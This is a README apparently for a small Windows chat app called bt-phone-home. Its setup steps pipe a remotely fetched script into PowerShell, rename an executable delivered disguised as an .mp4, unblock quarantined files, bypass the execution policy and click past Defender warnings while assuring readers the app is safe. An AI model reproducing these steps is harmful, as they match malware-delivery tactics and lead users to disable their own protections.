# bt-phone-home - Windows Setup

ultra-lightweight private chat for 2 people with military-grade terminal interface.

## quick start

### option 1: curl install (recommended)

open PowerShell and run:

```powershell
irm https://your-host.com/install.ps1 | iex
Install-BtPhoneHome -Username yourname -RoomName secret-room
```

replace `yourname` and `secret-room` with your actual username and room name.

### option 2: manual download

if you received the files:
- `bt-phone-home.exe` - the encrypted chat client
- `run.ps1` - setup script

open PowerShell and paste:

```powershell
cd $env:USERPROFILE\Downloads; .\run.ps1 yourname secret-room
```

### option 3: manual setup

if the automated methods don't work:

1. open PowerShell
2. navigate to Downloads:
   ```powershell
   cd $env:USERPROFILE\Downloads
   ```

3. if the file is named `bt-phone-home.exe.mp4`, rename it:
   ```powershell
   Rename-Item "bt-phone-home.exe.mp4" "bt-phone-home.exe"
   ```

4. unblock the file:
   ```powershell
   Unblock-File bt-phone-home.exe
   ```

5. run with your name and room:
   ```powershell
   .\bt-phone-home.exe yourname secret-room
   ```

## troubleshooting

### "execution of scripts is disabled"

if you get an error about script execution, run this first:

```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
```

then retry the one-line command.

### "Windows protected your PC"

if Windows Defender blocks it:
1. click "more info"
2. click "run anyway"

this is normal for unsigned binaries. the app is safe - it only connects to the encrypted database.

### "file cannot be opened"

the file might still be quarantined:

```powershell
Unblock-File bt-phone-home.exe
```

## using the chat

### send messages
- type your message
- press enter
- your message appears with timestamp

### commands
- `/burn` - permanently deletes all message history

### exit
- press `Ctrl+C`

## security features

- AES-256-GCM encryption (messages encrypted before leaving your computer)
- credentials embedded in binary (no setup needed)
- end-to-end encrypted - database only sees encrypted data
- no server to maintain or hack

## what it looks like

```
╔══════════════════════════════════════════════════════════╗
║   BT PHONE HOME                                          ║
║   CLASSIFIED COMMUNICATIONS TERMINAL                     ║
╚══════════════════════════════════════════════════════════╝

SYSTEM INITIALIZING...
>>> loading security protocols... OK
>>> verifying operator credentials... OK
>>> establishing quantum-resistant handshake... OK
>>> activating end-to-end encryption... OK

╔════════════════════════════════════════╗
║  SECURE CHANNEL ACTIVE                 ║
║  OPERATOR: YOURNAME                    ║
║  ENCRYPTION: AES-256-GCM               ║
╚════════════════════════════════════════╝

[15:04] alice: hello
[15:05] bob: hey there
```

## cost

$0/month. completely free.

## support

if you have issues, contact the person who sent you this.
